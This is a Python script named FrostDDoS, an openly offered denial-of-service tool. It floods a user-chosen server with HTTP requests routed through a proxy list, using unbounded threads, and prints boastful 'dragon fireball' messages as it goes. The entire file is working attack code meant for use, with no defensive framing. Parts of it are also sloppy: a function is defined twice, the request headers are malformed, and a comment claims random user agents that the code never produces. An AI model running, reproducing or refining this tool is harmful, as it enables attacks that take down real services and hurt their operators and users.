import shutil
from queue import Queue
from argparse import ArgumentParser
import time
import sys
import socket
import threading
import logging
import random
import requests

def print_centered(text, scale=1):
    terminal_width = shutil.get_terminal_size().columns
    scaled_width = terminal_width // scale
    for line in text.split('\n'):
        left_padding = (scaled_width - len(line)) // 2
        print(" " * left_padding + line)

def print_red_gradient(text):
    gradient_colors = [(255, 0, 0), (255, 50, 50), (255, 100, 100), (255, 150, 150), (255, 200, 200)]
    for i, char in enumerate(text):
        r, g, b = gradient_colors[min(i, len(gradient_colors) - 1)]
        print(f"\x1b[38;2;{r};{g};{b}m{char}\x1b[0m", end="")

ascii_art = ''' 
                                             
 _____             _   ____  ____      _____ 
|   __|___ ___ ___| |_|    \|    \ ___|   __|
|   __|  _| . |_ -|  _|  |  |  |  | . |__   |
|__|  |_| |___|___|_| |____/|____/|___|_____|
                                             
'''

text = "Coded By FrostFoe"

# Determine scaling factor based on terminal width
terminal_width = shutil.get_terminal_size().columns
scale = max(1, terminal_width // 80)

print_centered(ascii_art, scale=scale)
print_centered(text, scale=scale)

def print_centered(text, scale=1):
    terminal_width = shutil.get_terminal_size().columns
    scaled_width = terminal_width // scale
    for line in text.split('\n'):
        left_padding = (scaled_width - len(line)) // 2
        print(" " * left_padding + line)

def user_agent():
    # Dynamically select a random user agent for each request
    uagent = requests.utils.default_user_agent()
    return uagent

dragon_counter = 0  # Counter to keep track of dragons throwing fireballs

def down_it(proxy, host, preference):
    global dragon_counter
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((proxy.split(':')[0], int(proxy.split(':')[1])))
            packet = f"GET / HTTP/1.1\nHost: {host}\n\n User-Agent: {user_agent()}\nX-Preference: {preference}\n".encode('utf-8')
            if s.sendto(packet, (proxy.split(':')[0], int(proxy.split(':')[1]))):
                s.shutdown(1)
                dragon_counter += 1  # Increment the counter
                if dragon_counter in [1, 3, 4]:  # Check if it's the first, third, or fourth dragon
                    print("\033[92m", time.ctime(time.time()), "\033[0m \033[94m <--Fireball sent! The ancient dragon breathes fire at its foe...🐲🔥💥\033[0m")
                else:
                    print("\033[92m", time.ctime(time.time()), "\033[0m \033[94m <--Fireball sent! Another dragon joins the fray, hurling fireballs!🐉🔥💥\033[0m")
            else:
                s.shutdown(1)
                print("\033[91mConnection shut down\033[0m")
        except:
            pass

def dos(proxy_list, host, port, thr, preference):
    while True:
        for proxy in proxy_list:
            threading.Thread(target=down_it, args=(proxy, host, preference)).start()

def usage():
    print('''\033[91mFrostDDoS - Coded by FrostFoe

    Usage: python3 FrostDDoS.py [-h] [-s HOST] [-p PORT] [-t TURBO]
    -h : You Dare Ask for Help?!
    -s : Server IP to Incinerate Under the Dragon's Wrath
    -p : Port (default 80)
    -t : Turbo (default 300, but You Want Faster? I'll Give You Faster!) 
    -pref : FrostFoe's preference (default high)\033[0m''')
    sys.exit()

def get_parameters():
    parser = ArgumentParser(description="FrostDDoS - Coded by FrostFoe")
    parser.add_argument("-s", "--server", dest="host", required=True, help="Attack to server IP -s IP")
    parser.add_argument("-p", "--port", type=int, dest="port", default=80, help="Port (default 80)")
    parser.add_argument("-t", "--turbo", type=int, dest="turbo", default=300, help="Turbo (default 300)")
    parser.add_argument("-pref", "--preference", dest="preference", default="high", help="FrostFoe's preference (default high)")
    args = parser.parse_args()
    return args

if __name__ == '__main__':
    args = get_parameters()
    host = args.host
    port = args.port
    thr = args.turbo * 500
    preference = args.preference
    print("\033[92m", host, "Port: ", str(port), "Turbo: ", str(thr), "\033[0m")
    print("\033[94mLet the Dragon's Wrath begin...🔥🐉💥🌋\033[0m")
    print(f"\033[94mFrostFoe's preference: {preference}\033[0m")
    proxy_list = []
    with open('proxy.txt', 'r') as proxy_file:
        proxy_list = [line.strip() for line in proxy_file.readlines()]
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, int(port)))
        s.settimeout(1)
    except:
        print("\033[91mCheck server IP and port\033[0m")
        sys.exit()
    while True:
        for i in range(int(thr)):
            threading.Thread(target=dos, args=(proxy_list, host, port, thr, preference)).start()
